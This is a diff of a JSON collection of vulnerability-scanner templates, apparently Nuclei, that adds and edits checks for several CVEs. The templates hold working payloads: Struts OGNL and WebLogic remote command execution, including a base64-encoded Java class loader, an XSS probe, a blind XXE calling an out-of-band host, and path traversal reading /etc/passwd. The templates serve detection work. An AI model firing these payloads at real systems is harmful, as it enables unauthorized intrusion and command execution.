@@ -6557,9 +6557,9 @@
             ]
           },
           "raw": [
-            "GET /index.action?§params§:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\nAccept-Language: en\n",
-            "GET /login.action?§params§:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\nAccept-Language: en\n",
-            "GET /index.action?§params§%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\nAccept-Language: en\n"
+            "GET /index.action?{{params}}:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "GET /login.action?{{params}}:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "GET /index.action?{{params}}%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
           ]
         }
       ]
@@ -10101,6 +10101,57 @@
       ]
     },
     {
+      "id": "CVE-2016-1000143",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2016-1000143",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Reflected XSS in wordpress plugin photoxhibit v2.1.8",
+        "name": "Photoxhibit v2.1.8 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": [
+          "http://www.vapidlabs.com/wp/wp_advisory.php?v=780",
+          "https://nvd.nist.gov/vuln/detail/CVE-2016-1000143"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/photoxhibit/common/inc/pages/build.php?gid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-1000146",
       "info": {
         "author": "daffainfo",
@@ -12309,7 +12360,6 @@
       },
       "requests": [
         {
-          "attack": "sniper",
           "matchers": [
             {
               "status": [
@@ -19665,7 +19715,6 @@
       },
       "requests": [
         {
-          "attack": "sniper",
           "matchers": [
             {
               "status": [
@@ -20495,6 +20544,43 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/_async/AsyncResponseService"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-2729",
+      "info": {
+        "author": "igibanez",
+        "classification": {
+          "cve-id": "CVE-2019-2729",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8
+        },
+        "description": "Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0 and 12.2.1.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.",
+        "name": "Oracle WebLogic Server Administration Console Handle RCE",
+        "severity": "critical",
+        "tags": "cve,cve2019,oracle,rce,weblogic"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "CVE-2019-2729"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java><void class=\"sun.misc.BASE64Decoder\"><void method=\"decodeBuffer\" id=\"byte_arr\"><string>yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7</string></void></void><void class=\"org.mozilla.classfile.DefiningClassLoader\"><void method=\"defineClass\"><string>ResultBaseExec</string><object idref=\"byte_arr\"></object><void method=\"newInstance\"><void method=\"do_exec\" id=\"result\"><string>echo${IFS}9272-9102-EVC|rev</string></void></void></void></void><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\" id=\"current_work\"><void method=\"getClass\"><void method=\"getDeclaredField\"><string>connectionHandler</string><void method=\"setAccessible\"><boolean>true</boolean></void><void method=\"get\"><object idref=\"current_work\"></object><void method=\"getServletRequest\"><void method=\"getResponse\"><void method=\"getServletOutputStream\"><void method=\"writeStream\"><object class=\"weblogic.xml.util.StringInputStream\"><object idref=\"result\"></object></object></void><void method=\"flush\"/></void><void method=\"getWriter\"><void method=\"write\"><string></string></void></void></void></void></void></void></void></void></void></java>]]></string></void></class></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>\n"
           ]
         }
       ]
@@ -23489,7 +23575,6 @@
           "matchers": [
             {
               "condition": "or",
-              "part": "body",
               "regex": [
                 "root:.*:0:0:",
                 "\\[(font|extension|file)s\\]"
@@ -23511,7 +23596,7 @@
             ]
           },
           "raw": [
-            "POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1\nHost: {{Hostname}}\ncmd: §exec§\nConnection: close\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\n_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession%28%22var%20m%20%3D%20java.lang.Class.forName%28%22weblogic.work.ExecuteThread%22%29.getDeclaredMethod%28%22getCurrentWork%22%29%3B%20var%20currThread%20%3D%20java.lang.Thread.currentThread%28%29%3B%20var%20currWork%20%3D%20m.invoke%28currThread%29%3B%20var%20f2%20%3D%20currWork.getClass%28%29.getDeclaredField%28%22connectionHandler%22%29%3B%20f2.setAccessible%28true%29%3B%20var%20connectionHandler%20%3D%20f2.get%28currWork%29%3B%20var%20f3%20%3D%20connectionHandler.getClass%28%29.getDeclaredField%28%22request%22%29%3B%20f3.setAccessible%28true%29%3B%20var%20request%20%3D%20f3.get%28connectionHandler%29%3B%20var%20command%20%3D%20request.getHeader%28%22cmd%22%29%3B%20var%20response%20%3D%20request.getResponse%28%29%3B%20var%20isWin%20%3D%20java.lang.System.getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%3B%20var%20listCmd%20%3D%20new%20java.util.ArrayList%28%29%3B%20var%20p%20%3D%20new%20java.lang.ProcessBuilder%28%22%22%29%3B%20if%28isWin%29%7Bp.command%28%22cmd.exe%22%2C%20%22%2Fc%22%2C%20command%29%3B%20%7Delse%7Bp.command%28%22%2Fbin%2Fbash%22%2C%20%22-c%22%2C%20command%29%3B%20%7D%20p.redirectErrorStream%28true%29%3B%20var%20process%20%3D%20p.start%28%29%3B%20var%20output%20%3D%20process.getInputStream%28%29%3B%20var%20scanner%20%3D%20new%20java.util.Scanner%28output%29.useDelimiter%28%22%5C%5C%5C%5CA%22%29%3B%20var%20out%20%3D%20scanner.next%28%29%3B%20var%20outputStream%20%3D%20response.getServletOutputStream%28%29%3B%20outputStream.write%28out.getBytes%28%29%29%3B%20outputStream.flush%28%29%3B%20response.getWriter%28%29.write%28%22%22%29%3B%20currThread.interrupt%28%29%3B%22%29\n"
+            "POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1\nHost: {{Hostname}}\ncmd: {{exec}}\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\n_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession%28%22var%20m%20%3D%20java.lang.Class.forName%28%22weblogic.work.ExecuteThread%22%29.getDeclaredMethod%28%22getCurrentWork%22%29%3B%20var%20currThread%20%3D%20java.lang.Thread.currentThread%28%29%3B%20var%20currWork%20%3D%20m.invoke%28currThread%29%3B%20var%20f2%20%3D%20currWork.getClass%28%29.getDeclaredField%28%22connectionHandler%22%29%3B%20f2.setAccessible%28true%29%3B%20var%20connectionHandler%20%3D%20f2.get%28currWork%29%3B%20var%20f3%20%3D%20connectionHandler.getClass%28%29.getDeclaredField%28%22request%22%29%3B%20f3.setAccessible%28true%29%3B%20var%20request%20%3D%20f3.get%28connectionHandler%29%3B%20var%20command%20%3D%20request.getHeader%28%22cmd%22%29%3B%20var%20response%20%3D%20request.getResponse%28%29%3B%20var%20isWin%20%3D%20java.lang.System.getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%3B%20var%20listCmd%20%3D%20new%20java.util.ArrayList%28%29%3B%20var%20p%20%3D%20new%20java.lang.ProcessBuilder%28%22%22%29%3B%20if%28isWin%29%7Bp.command%28%22cmd.exe%22%2C%20%22%2Fc%22%2C%20command%29%3B%20%7Delse%7Bp.command%28%22%2Fbin%2Fbash%22%2C%20%22-c%22%2C%20command%29%3B%20%7D%20p.redirectErrorStream%28true%29%3B%20var%20process%20%3D%20p.start%28%29%3B%20var%20output%20%3D%20process.getInputStream%28%29%3B%20var%20scanner%20%3D%20new%20java.util.Scanner%28output%29.useDelimiter%28%22%5C%5C%5C%5CA%22%29%3B%20var%20out%20%3D%20scanner.next%28%29%3B%20var%20outputStream%20%3D%20response.getServletOutputStream%28%29%3B%20outputStream.write%28out.getBytes%28%29%29%3B%20outputStream.flush%28%29%3B%20response.getWriter%28%29.write%28%22%22%29%3B%20currThread.interrupt%28%29%3B%22%29\n"
           ]
         }
       ]
@@ -25314,6 +25399,46 @@
           "raw": [
             "POST / HTTP/1.1\nHost: {{Hostname}}\nCookie: uid=6gPjT2ipmNz\n\nusername=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b\n",
             "GET /cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=cat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nCookie: uid=6gPjT2ipmNz\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-24589",
+      "info": {
+        "author": "lethargynavigator",
+        "classification": {
+          "cve-id": "CVE-2020-24589",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
+          "cvss-score": 9.1
+        },
+        "description": "WSO2 API Manager 3.1.0 and earlier is vulnerable to blind XXE.",
+        "name": "WSO2 API Manager Blind XXE",
+        "reference": "https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742",
+        "severity": "critical",
+        "tags": "cve,cve2020,wso2,xxe,oast"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Failed to install the generic artifact type"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /carbon/generic/save_artifact_ajaxprocessor.jsp HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\npayload=<%3fxml+version%3d\"1.0\"+%3f><!DOCTYPE+a+[+<!ENTITY+%25+xxe+SYSTEM+\"http%3a//{{interactsh-url}}\">%25xxe%3b]>\n"
           ]
         }
       ]
@@ -28315,7 +28440,6 @@
       },
       "requests": [
         {
-          "attack": "sniper",
           "extractors": [
             {
               "part": "body",
@@ -28328,6 +28452,7 @@
           ],
           "matchers": [
             {
+              "condition": "or",
               "regex": [
                 "OS Name:.*Microsoft Windows",
                 "Distributor ID:"
@@ -29555,7 +29680,8 @@
           "path": [
             "{{BaseURL}}/actions/seomatic/meta-container/meta-link-container/?uri={{228*'98'}}",
             "{{BaseURL}}/actions/seomatic/meta-container/all-meta-containers?uri={{228*'98'}}"
-          ]
+          ],
+          "skip-variables-check": true
         }
       ]
     },
@@ -34833,7 +34959,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "true",
+                "\"result\":true",
                 "id",
                 "params",
                 "session"
@@ -36936,14 +37062,14 @@
               "name": "RCE",
               "type": "word",
               "words": [
-                "CVE-2021-41773"
+                "CVE-2021-41773-POC"
               ]
             }
           ],
           "matchers-condition": "or",
           "raw": [
             "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n",
-            "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\necho Content-Type: text/plain; echo; echo 37714-1202-EVC | rev\n"
+            "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\necho Content-Type: text/plain; echo; echo COP-37714-1202-EVC | rev\n"
           ]
         }
       ]
